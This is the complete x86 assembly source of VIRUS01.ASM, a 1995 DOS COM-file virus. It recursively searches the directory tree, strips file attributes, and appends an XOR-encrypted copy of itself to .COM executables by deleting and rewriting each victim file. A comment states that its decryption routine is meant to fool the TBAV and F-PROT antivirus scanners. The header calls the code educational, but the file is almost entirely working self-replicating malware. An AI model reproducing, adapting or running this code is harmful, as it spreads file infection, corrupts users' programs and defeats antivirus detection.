;
;	VIRUS01.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a non-resident COM file infector, encrypted with an
; XOR algorithm.
;
; The virus will search the whole tree for files to infect, therefore
; becomes very slow. Upon infection, the victim is loaded into memory
; and the encrypted virus will be appended to it. The original file will
; then be deleted and replaced by the new file containing the modified code.
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	.model tiny
	.code
	.startup
	locals @@

VirusSize	equ	EndVirus-BeginVirus

;---------------------------------------------------------------------
;	The virus begins here
;---------------------------------------------------------------------

BeginVirus:
	jmp	EntryPoint

;---------------------------------------------------------------------
;	Start of encrypted section
;---------------------------------------------------------------------

BeginEncryptedSection:
	lea	si, [bp+offset OldJmp]
	mov	di, 100h
	push	di
	movsw
	movsb

	call	TraverseTree
	jmp	ExitVirus				; Exit on error

TraverseTree:
	push	si					; Create stack frame
	mov	si, sp
	sub	sp, 44					; Allocate space for DTA

	push	si
	call	InfectDirectory				; Go to search & destroy routines
	pop	si

	mov	ah, 1ah					; Set DTA
	lea	dx, word ptr [si-44]			; to space allotted
	int	21h					; Do it now!

	mov	ah, 4eh					; Find first
	mov	cx, 10h					; Directory mask
	lea	dx, [bp+offset DirMask]			; *.*
	int	21h
	jmp	short @@next3

@@next1:cmp	byte ptr [si-14], '.'			; Is first char == '.'?
	je	short @@next2				; If so, loop again
	lea	dx, word ptr [si-14]			; else load dirname
	mov	ah, 3bh					; and changedir there
	int	21h
	jc	short @@next2				; Do next if invalid
	inc	word ptr [bp+offset Nest]		; Nest++
	call	near ptr TraverseTree			; recurse directory

@@next2:lea	dx, word ptr [si-44]			; Load space allocated for DTA
	mov	ah, 1ah					; and set DTA to this new area
	int	21h					; 'cause it might have changed

	mov	ah, 4fh					; Find next
	int	21h

@@next3:jnc	@@next1					; If OK, jmp elsewhere
	cmp	word ptr [bp+offset Nest], 0		; If root directory Nest = 0
	jle	short @@quit				; then Quit
	dec	word ptr [bp+offset Nest]		; Else decrement Nest
	lea	dx, [bp+offset BackDir]			; '..'
	mov	ah, 3bh					; Change directory
	int	21h					; to previous one

@@quit:	mov	sp, si
	pop	si
	ret

InfectDirectory:
	lea	dx, [bp+offset Dta]
	call	SetDta

	mov	ah, 4eh					; Find first
	lea	dx, [bp+ComMask]			; search for '*.COM',0
	xor	cx, cx					; attribute mask

TryAnotherFile:
	int	21h
	jnc	@@next
	ret						; return to traverse loop

@@next:	lea	si, [bp+offset Dta+15h]			; Start from attributes
	mov	cx, 5					; attribute, time, date
	lea	di, [bp+offset FileAttr]		; Move into your locations
	rep	movsb

	mov	ax, 04301h				; DOS set file attrib. function
	xor	cx, cx					; Clear all attributes
	lea	dx, [bp+Dta+30]				; DX points to victim's name
	int	21h

	mov	ax, 3d02h
	lea	dx, [bp+offset Dta+30]			; File name is located in DTA
	int	21h
	jnc	@@opened				; opened ok
	jmp	RestoreAttr				; open failed -- skip handle ops, just restore attrs
@@opened:
	xchg	ax, bx

	mov	ah, 3fh
	lea	dx, [bp+OldJmp]
	mov	cx, 3
	int	21h

	cmp	word ptr [bp+Dta+28], 0			; > 64K?
	jne	@@skip
	mov	ax, word ptr [bp+Dta+26]		; ax = filesize
	cmp	ax, (0ffffh-VirusSize)			; Dont infect too big
	jae	@@skip
	add	ax, offset EntryPoint-103h		; calculate entry offset to jmp
	mov	word ptr [bp+NewJmp+1], ax		; save jmp

	sub	ax, VirusSize				; = pre-infection size; self-recognition compare

	mov	cx, word ptr [bp+OldJmp+1]		; jmp location
	cmp	ax, cx					; if same, already infected
	jnz	InfectComFile				; so quit out of here
@@skip:	jmp	CloseFile

InfectComFile:
	mov	ah, 2ch					; Get random number
	int	21h
	mov	word ptr [bp+Key], dx

	xor	al, al					; Go SOF
	call	SetFilePointer

	push	bx
	mov	ah, 4ah					; Get #of free paras
	mov	bx, 0ffffh				; in bx
	int	21h

	sub	bx, 1000h+1				; change..
	mov	ah, 4ah
	int	21h

	mov	ah, 48h					; ..allocation.
	mov	bx, 1000h
	int	21h
	pop	bx
	jc	CloseFile

	mov	es, ax
	lea	si, [bp+BeginVirus]
	mov	di, word ptr [bp+Dta+26]
	mov	cx, VirusSize
	rep	movsb					; Copy virus to EO buffer

	push	bp
	mov	bp, word ptr [bp+Dta+26]
	sub	bp, offset BeginVirus

	push	es
	pop	ds
	call	EncryptDecrypt
	pop	bp

	mov	ah, 3fh					; read file to SO buffer
	mov	cx, word ptr [bp+Dta+26]
	cwd						; equivalent to: xor dx, dx
	int	21h

	push	cs
	pop	ds

	lea	si, [bp+NewJmp]				; replace the 3 first bytes
	xor	di, di
	movsw
	movsb

	mov	ah, 3eh					; Close file..
	int	21h

	mov	ah, 41h					; Delete orig file
	lea	dx, [bp+offset Dta+30]			; File name is located in DTA
	int	21h

	mov	ah, 3ch					; Create a new one
	xor	cx, cx
	lea	dx, [bp+offset Dta+30]			; File name is located in DTA
	int	21h
	xchg	ax, bx

	push	es
	pop	ds

	mov	ah, 40h					; Write file+virus
	mov	cx, word ptr [bp+Dta+26]
	add	cx, VirusSize
	cwd						; equivalent to: xor dx, dx
	int	21h

	mov	ah, 49h					; release memory
	int	21h

	push	cs
	push	cs
	pop	ds
	pop	es

CloseFile:
	mov	ax, 5701h				; Restore time/date
	mov	cx, [bp+FileTime]
	mov	dx, [bp+FileDate]
	int	21h

	mov	ah, 3eh					; Close file
	int	21h

RestoreAttr:
	mov	ax, 04301h				; DOS set file attrib. function
	xor	ch, ch
	mov	cl, [bp+FileAttr]			; Restore all attributes
	lea	dx, [bp+Dta+30]				; DX points to victim's name
	int	21h

	mov	ah, 4fh					; Find next
	jmp	TryAnotherFile

ExitVirus:
	mov	dx, 80h					; Restore current DTA to
							; the default @ PSP:80h
SetDta:	mov	ah, 1ah					; Set disk transfer address
	int	21h
	ret						; return to 100h

;---------------------------------------------------------------------
;	Helper functions
;---------------------------------------------------------------------

SetFilePointer:
	mov	ah, 42h					; Jump in file
	xor	cx, cx
	cwd
	int	21h
	ret

Nest	dw	0
BackDir	db	'..', 0
DirMask	db	'*.*', 0
ComMask	db	'*.com', 0
OldJmp	db	0cdh, 20h, 0
NewJmp	db	0e9h, 0, 0

EndEncryptedSection:

;---------------------------------------------------------------------
;	End of encrypted section
;---------------------------------------------------------------------

EntryPoint:
	push	ax
	pop	ax
	push	ax
	pop	ax
	call	GetDelta
EncryptDecrypt:
	mov	dx, word ptr ds:[bp+Key]		; routine here to
	lea	si, [bp+BeginEncryptedSection]		; fool TBAV/F-PROT
	mov	cx, (EndEncryptedSection-BeginEncryptedSection)/2
@@loop:	xor	word ptr ds:[si], dx			; Simple xor-loop
	inc	si					; encryption
	inc	si
	loop	@@loop
	ret
Key	dw	0					; en/decrypt value
GetDelta:
	pop	bp
	sub	bp, offset EncryptDecrypt		; Get delta offset
	call	EncryptDecrypt				; Decrypt virus
	jmp	BeginEncryptedSection

EndVirus:

;---------------------------------------------------------------------
;	The heap begins below
;---------------------------------------------------------------------

FileAttr	db	?
FileTime	dw	?
FileDate	dw	?
Dta		db	43 dup (?)

end
